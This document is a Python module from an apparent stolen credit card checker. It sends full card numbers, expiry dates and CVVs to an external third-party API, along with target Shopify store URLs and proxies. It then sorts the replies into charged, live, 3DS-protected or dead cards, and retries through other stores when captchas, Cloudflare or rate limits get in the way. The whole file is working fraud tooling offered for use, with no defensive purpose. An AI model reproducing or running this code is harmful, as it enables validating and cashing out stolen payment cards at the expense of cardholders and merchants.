import asyncio
import logging
import re
from dataclasses import dataclass
from typing import Optional
from core.card_parser import Card
import aiohttp

logger = logging.getLogger(__name__)


@dataclass
class CheckResult:
    status: str
    message: str
    gateway: str
    price: float
    store: str
    card: Card
    debug_info: str = ""


def extract_price(price_str):
    try:
        m = re.search(r'\$?([0-9.]+)', str(price_str))
        if m:
            return float(m.group(1))
    except Exception:
        pass
    return 0.0


# ═══════════════════════════════════════════════════════════════════
# RESPONSE CLASSIFICATION TRIGGERS (ShopixRzr pattern)
# Any of these in the API response message → SITE_ERROR → retry
# ═══════════════════════════════════════════════════════════════════
SITE_ERROR_TRIGGERS = (
    # Network / transport
    "request timeout", "timeout", "timed out",
    "connection failed", "connection reset", "connection refused",
    "network error", "unreachable", "empty reply from server",
    "could not resolve", "domain name not found",
    "name or service not known", "dns_error",
    "ssl error", "tlsv1 alert", "ssl routines", "openssl",
    # HTTP errors
    "http error", "httperror", "502", "503", "504",
    "bad gateway", "service unavailable", "gateway timeout",
    "http 404", "429", "rate limit", "too many requests",
    "api_http_error", "api_error",
    # Site protection / structure
    "cloudflare", "captcha_required", "captcha required",
    "access denied", "invalid url", "site error", "site dead",
    "site not supported", "site requires login",
    # Checkout pipeline failures
    "failed to detect product", "no valid products", "no_products_found",
    "failed to create checkout", "failed to tokenize card",
    "failed to get proposal data", "failed to get session token",
    "no_session_token", "tokenize_fail", "token_extraction_failed",
    "submit rejected", "handle error", "cart failed",
    "session_init_failed", "checkout_start_failed",
    "card_vault_failed", "submission_rejected",
    "invalid json response", "expecting value",
    "product price too high", "all products sold out",
    "unable to get payment token", "no valid payment method found",
    "proxy error", "failed_to_fetch", "unknown_error",
)

# These mean the CARD IS REAL but something else → LIVE
LIVE_TRIGGERS = (
    "insufficient_funds", "insufficient funds",
    "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc",
    "invalid cvv", "incorrect cvv", "invalid cvc", "incorrect cvc",
    "incorrect_zip", "incorrect zip",
    "approved", "success",
)

LIVE_3DS_TRIGGERS = (
    "otp_required", "otp required", "3ds", "3d secure",
    "authentication required", "verification required",
)

CHARGED_TRIGGERS = (
    "charged", "order completed", "order_placed", "order_paid",
    "thank you", "payment successful",
)


def classify_response(status_raw: str, msg: str) -> tuple[str, str]:
    """Classify API response into final status.

    Returns (status, message). Status is one of:
    CHARGED, LIVE, LIVE_3DS, DEAD, SITE_ERROR
    """
    status_lower = (status_raw or "").lower()
    msg_lower = (msg or "").lower()

    # 1. SITE ERROR — checked FIRST so any infra failure retries
    if (
        ("site" in status_lower and "error" in status_lower)
        or any(t in msg_lower for t in SITE_ERROR_TRIGGERS)
    ):
        return "SITE_ERROR", f"site_error: {msg}"

    # 2. CHARGED
    if "charged" in status_lower or any(t in msg_lower for t in CHARGED_TRIGGERS):
        return "CHARGED", msg

    # 3. LIVE 3DS
    if "3ds" in status_lower or any(t in msg_lower for t in LIVE_3DS_TRIGGERS):
        return "LIVE_3DS", msg

    # 4. LIVE / APPROVED
    if (
        status_lower in ("approved", "live")
        or any(t in msg_lower for t in LIVE_TRIGGERS)
    ):
        return "LIVE", msg

    # 5. Explicit DEAD
    if "dead" in status_lower or "declin" in msg_lower:
        return "DEAD", msg

    # 6. Empty/unknown status with no recognizable message → retry
    if not status_raw and not msg:
        return "SITE_ERROR", "site_error: empty_api_response"

    # 7. Fallback: unrecognized → treat as site error (safer than false DEAD)
    return "SITE_ERROR", f"site_error: unclassified_response: {msg[:80]}"


async def shopify_check(
    card: Card,
    store_url: str,
    proxy: Optional[str] = None,
    timeout: int = 120,
    max_retries: int = 2,
) -> CheckResult:
    """Check a card via the external Shopify API.

    Returns CheckResult with status CHARGED/LIVE/LIVE_3DS/DEAD/SITE_ERROR.
    SITE_ERROR means the caller should retry with a different store.
    """
    api_url = "https://cozy-abundance-production-88ca.up.railway.app/shopify"

    if not store_url.startswith("http"):
        store_url = f"https://{store_url}"

    params = {
        "site": store_url,
        "cc": f"{card.number}|{card.month}|{card.year}|{card.cvv}",
    }
    if proxy:
        params["proxy"] = proxy

    backoff = (3, 6)

    async with aiohttp.ClientSession() as session:
        for attempt in range(max_retries + 1):
            try:
                api_timeout = aiohttp.ClientTimeout(total=timeout)
                async with session.get(api_url, params=params, timeout=api_timeout) as r:
                    if r.status == 200:
                        try:
                            # content_type=None → never fail on bad content-type
                            data = await r.json(content_type=None)
                        except Exception:
                            text = await r.text()
                            logger.debug("External API non-JSON: %.200s", text)
                            if attempt < max_retries:
                                await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
                                continue
                            return CheckResult("SITE_ERROR", "site_error: invalid_json_response",
                                               "Shopify Payments", 0.0, store_url, card)

                        if not isinstance(data, dict):
                            data = {}

                        status_raw = str(data.get("Status") or "")
                        msg = str(data.get("Response") or data.get("RawResponse") or "")
                        gw = str(data.get("Gateway") or "Shopify Payments")
                        price = extract_price(data.get("Price", "0.0"))

                        status, final_msg = classify_response(status_raw, msg)
                        return CheckResult(status, final_msg, gw, price, store_url, card)

                    elif r.status in (502, 503, 504, 429):
                        logger.debug("External API %s (attempt %d/%d)",
                                     r.status, attempt + 1, max_retries + 1)
                        if attempt < max_retries:
                            await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
                            continue
                        return CheckResult("SITE_ERROR", f"site_error: api_http_error_{r.status}",
                                           "Shopify Payments", 0.0, store_url, card)
                    else:
                        text = await r.text()
                        logger.debug("External API error %s: %.200s", r.status, text)
                        if attempt < max_retries:
                            await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
                            continue
                        return CheckResult("SITE_ERROR", f"site_error: api_http_error_{r.status}",
                                           "Shopify Payments", 0.0, store_url, card)

            except asyncio.TimeoutError:
                logger.debug("External API timeout (attempt %d/%d)", attempt + 1, max_retries + 1)
                if attempt < max_retries:
                    await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
                    continue
                return CheckResult("SITE_ERROR", "site_error: timeout",
                                   "Shopify Payments", 0.0, store_url, card)
            except Exception as e:
                logger.debug("External API exception: %s", e)
                if attempt < max_retries:
                    await asyncio.sleep(backoff[min(attempt, len(backoff) - 1)])
                    continue
                return CheckResult("SITE_ERROR", f"site_error: {str(e)[:60]}",
                                   "Shopify Payments", 0.0, store_url, card)

    return CheckResult("SITE_ERROR", "site_error: max_retries_exhausted",
                       "Shopify Payments", 0.0, store_url, card)


# Dummy stripe_check so imports don't break
async def stripe_check(card: Card, proxy: Optional[str] = None, timeout: int = 15, secret_key: str = "") -> CheckResult:
    return CheckResult("DEAD", "stripe_disabled", "Stripe", 0.0, "stripe", card)
